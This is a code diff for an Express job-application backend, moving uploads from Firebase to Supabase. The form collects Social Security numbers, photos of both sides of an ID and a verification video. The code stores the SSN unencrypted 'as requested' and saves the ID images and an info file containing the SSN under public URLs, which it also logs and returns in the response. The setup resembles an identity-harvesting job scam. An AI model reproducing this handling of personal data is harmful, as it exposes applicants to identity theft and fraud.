@@ -3,15 +3,17 @@ const cors = require('cors');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
-const { uploadToFirebase, initializeFirebase } = require('./firebase-config');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 const PORT = process.env.PORT || 8000;
 
-// Initialize Firebase on startup
-initializeFirebase();
+// Supabase configuration
+const supabaseUrl = process.env.SUPABASE_URL || 'https://your-project.supabase.co';
+const supabaseKey = process.env.SUPABASE_ANON_KEY || 'your-anon-key';
+const supabase = createClient(supabaseUrl, supabaseKey);
 
-// Ensure uploads directory exists for application info files
+// Ensure local uploads directory exists for temporary files
 const uploadsDir = path.join(__dirname, 'backend', 'uploads');
 if (!fs.existsSync(uploadsDir)) {
   fs.mkdirSync(uploadsDir, { recursive: true });
@@ -25,7 +27,7 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // Static files - serve everything from root
 app.use(express.static(__dirname));
 
-// File upload configuration - use memory storage for Firebase uploads
+// File upload configuration - using memory storage for Supabase
 const storage = multer.memoryStorage();
 
 const upload = multer({ 
@@ -58,25 +60,57 @@ const upload = multer({
   }
 });
 
+// Helper function to upload file to Supabase Storage
+async function uploadToSupabase(file, fileName, folderName) {
+  try {
+    const filePath = `applications/${folderName}/${fileName}`;
+    
+    const { data, error } = await supabase.storage
+      .from('job-applications')
+      .upload(filePath, file.buffer, {
+        contentType: file.mimetype,
+        upsert: false
+      });
+
+    if (error) {
+      console.error('Supabase upload error:', error);
+      throw error;
+    }
+
+    // Get public URL
+    const { data: { publicUrl } } = supabase.storage
+      .from('job-applications')
+      .getPublicUrl(filePath);
+
+    return {
+      success: true,
+      url: publicUrl,
+      path: filePath
+    };
+  } catch (error) {
+    console.error('Upload to Supabase failed:', error);
+    return {
+      success: false,
+      error: error.message
+    };
+  }
+}
+
 // Routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Health check endpoint - Enhanced for Railway
 app.get('/health', (req, res) => {
   try {
-    // Check if uploads directory exists and is writable
-    const uploadsCheck = fs.existsSync(uploadsDir);
-    
     res.json({ 
       status: 'OK', 
       timestamp: new Date().toISOString(),
       environment: process.env.NODE_ENV || 'development',
       port: PORT,
-      uploadsDir: uploadsCheck ? 'Ready' : 'Creating...',
-      firebase: process.env.FIREBASE_SERVICE_ACCOUNT ? 'Configured' : 'Not configured',
-      uptime: process.uptime()
+      storage: 'Supabase Cloud',
+      uptime: process.uptime(),
+      supabaseConfigured: !!(process.env.SUPABASE_URL && process.env.SUPABASE_ANON_KEY)
     });
   } catch (error) {
     console.error('Health check failed:', error);
@@ -98,7 +132,7 @@ app.post('/api/submit-application', upload.fields([
     const { name, email, phone, firstName, lastName, experience, schedule, location, ssn } = req.body;
     const files = req.files;
     
-    // Create folder name for local application info
+    // Create folder name
     const fullName = `${firstName} ${lastName}`;
     const safeFolderName = fullName
       .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
@@ -106,57 +140,40 @@ app.post('/api/submit-application', upload.fields([
       .toLowerCase();
     
     const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
-    const applicantFolder = `${timestamp}_${safeFolderName}`;
-    const applicantDir = path.join(uploadsDir, applicantFolder);
+    const folderName = `${timestamp}_${safeFolderName}`;
     
-    // Create local directory for application info
-    if (!fs.existsSync(applicantDir)) {
-      fs.mkdirSync(applicantDir, { recursive: true });
-    }
-
-    // Upload files to Firebase and get URLs
+    // Upload files to Supabase Storage
+    const uploadResults = {};
     const fileUrls = {};
     
     if (files && files.idFront) {
-      try {
-        const frontIdUrl = await uploadToFirebase(
-          files.idFront[0].buffer, 
-          `front-id${path.extname(files.idFront[0].originalname)}`,
-          applicantFolder
-        );
-        fileUrls.frontId = frontIdUrl;
-      } catch (error) {
-        console.error('Failed to upload front ID:', error);
-      }
-    }
-
-    if (files && files.idBack) {
-      try {
-        const backIdUrl = await uploadToFirebase(
-          files.idBack[0].buffer, 
-          `back-id${path.extname(files.idBack[0].originalname)}`,
-          applicantFolder
-        );
-        fileUrls.backId = backIdUrl;
-      } catch (error) {
-        console.error('Failed to upload back ID:', error);
-      }
-    }
-
-    if (files && files.video) {
-      try {
-        const videoUrl = await uploadToFirebase(
-          files.video[0].buffer, 
-          `verification-video${path.extname(files.video[0].originalname)}`,
-          applicantFolder
-        );
-        fileUrls.video = videoUrl;
-      } catch (error) {
-        console.error('Failed to upload video:', error);
+      const file = files.idFront[0];
+      const fileName = `front-id${path.extname(file.originalname)}`;
+      uploadResults.idFront = await uploadToSupabase(file, fileName, folderName);
+      if (uploadResults.idFront.success) {
+        fileUrls.idFront = uploadResults.idFront.url;
       }
     }
     
-    // Create application info with Firebase URLs
+    if (files && files.idBack) {
+      const file = files.idBack[0];
+      const fileName = `back-id${path.extname(file.originalname)}`;
+      uploadResults.idBack = await uploadToSupabase(file, fileName, folderName);
+      if (uploadResults.idBack.success) {
+        fileUrls.idBack = uploadResults.idBack.url;
+      }
+    }
+    
+    if (files && files.video) {
+      const file = files.video[0];
+      const fileName = `verification-video${path.extname(file.originalname)}`;
+      uploadResults.video = await uploadToSupabase(file, fileName, folderName);
+      if (uploadResults.video.success) {
+        fileUrls.video = uploadResults.video.url;
+      }
+    }
+    
+    // Create application info
     const applicationInfo = {
       timestamp: new Date().toISOString(),
       applicantName: `${firstName} ${lastName}`,
@@ -167,16 +184,16 @@ app.post('/api/submit-application', upload.fields([
       schedule: schedule,
       ssn: ssn || 'Not provided', // Store SSN unencrypted as requested
       applicationId: 'APP-' + Date.now(),
+      folderName: folderName,
+      fileUrls: fileUrls,
       filesUploaded: {
-        idFront: files && files.idFront ? 'Yes' : 'No',
-        idBack: files && files.idBack ? 'Yes' : 'No',
-        video: files && files.video ? 'Yes' : 'No'
-      },
-      firebaseUrls: fileUrls
+        idFront: uploadResults.idFront?.success ? 'Yes' : 'No',
+        idBack: uploadResults.idBack?.success ? 'Yes' : 'No',
+        video: uploadResults.video?.success ? 'Yes' : 'No'
+      }
     };
     
-    // Save application info to local text file
-    const infoFilePath = path.join(applicantDir, 'application-info.txt');
+    // Save application info to Supabase Storage as text file
     const infoText = `CUSTOMER SERVICE APPLICATION
 ========================================
 
@@ -192,33 +209,51 @@ Applicant Information:
 Application Details:
 - Application ID: ${applicationInfo.applicationId}
 - Submission Date: ${applicationInfo.timestamp}
-- Folder: ${applicantFolder}
+- Folder: ${folderName}
+
+File URLs:
+- Front ID: ${fileUrls.idFront || 'Not uploaded'}
+- Back ID: ${fileUrls.idBack || 'Not uploaded'}
+- Verification Video: ${fileUrls.video || 'Not uploaded'}
 
 Files Uploaded:
 - Front ID: ${applicationInfo.filesUploaded.idFront}
 - Back ID: ${applicationInfo.filesUploaded.idBack}
 - Verification Video: ${applicationInfo.filesUploaded.video}
 
-Firebase File URLs:
-- Front ID URL: ${fileUrls.frontId || 'Not uploaded'}
-- Back ID URL: ${fileUrls.backId || 'Not uploaded'}
-- Video URL: ${fileUrls.video || 'Not uploaded'}
-
 Status: Pending Review
 ========================================`;
 
-    fs.writeFileSync(infoFilePath, infoText);
+    // Upload application info to Supabase
+    const infoBuffer = Buffer.from(infoText, 'utf8');
+    const infoFilePath = `applications/${folderName}/application-info.txt`;
+    
+    const { data: infoUpload, error: infoError } = await supabase.storage
+      .from('job-applications')
+      .upload(infoFilePath, infoBuffer, {
+        contentType: 'text/plain',
+        upsert: false
+      });
+
+    if (infoError) {
+      console.error('Failed to upload application info:', infoError);
+    }
+
+    // Get public URL for application info
+    const { data: { publicUrl: infoUrl } } = supabase.storage
+      .from('job-applications')
+      .getPublicUrl(infoFilePath);
     
     console.log('=== New Application Received ===');
     console.log('Applicant:', applicationInfo.applicantName);
-    console.log('Local Folder Created:', applicantFolder);
+    console.log('Folder Created:', folderName);
     console.log('Email:', email);
     console.log('Phone:', phone);
-    console.log('Firebase Files:');
-    if (fileUrls.frontId) console.log('- Front ID:', fileUrls.frontId);
-    if (fileUrls.backId) console.log('- Back ID:', fileUrls.backId);
+    console.log('Supabase Storage URLs:');
+    if (fileUrls.idFront) console.log('- ID Front:', fileUrls.idFront);
+    if (fileUrls.idBack) console.log('- ID Back:', fileUrls.idBack);
     if (fileUrls.video) console.log('- Video:', fileUrls.video);
-    console.log('Info saved to:', infoFilePath);
+    console.log('- Application Info:', infoUrl);
     console.log('================================');
     
     // Simulate processing time
@@ -227,8 +262,10 @@ Status: Pending Review
         success: true, 
         message: 'Application submitted successfully! We will contact you within 24 hours.',
         applicationId: applicationInfo.applicationId,
-        applicantFolder: applicantFolder,
+        applicantFolder: folderName,
+        storageType: 'Supabase Cloud Storage',
         fileUrls: fileUrls,
+        infoUrl: infoUrl,
         nextSteps: [
           'Check your email for confirmation',
           'Prepare for a brief phone screening',
